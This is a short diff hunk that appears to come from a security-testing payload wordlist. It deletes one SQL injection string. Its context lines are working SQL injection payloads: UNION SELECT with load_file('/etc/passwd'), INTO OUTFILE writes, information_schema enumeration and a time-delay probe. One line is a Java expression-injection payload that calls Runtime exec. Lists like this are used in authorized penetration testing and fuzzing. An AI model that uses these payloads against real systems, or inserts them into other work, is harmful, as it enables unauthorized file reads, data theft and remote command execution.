@@ -6920,7 +6920,6 @@ ${t(org.apache.commons.io.ioutils).tostring(t(java.lang.runtime).getruntime().ex
 ' union select 1,2`
 ' union select 1,load_file('/etc/passwd'),1,1,1;
 ' union select load_file('/etc/passwd'),2,3,4,5,6,7,8,9,10,11,12,13,14 into outfile 'passwd
-' union select null--
 ' union select sum(columnname ) from tablename --
 ' union select table_schema,table_name from information_schema.tables;#
 ' waitfor delay '00:02' --
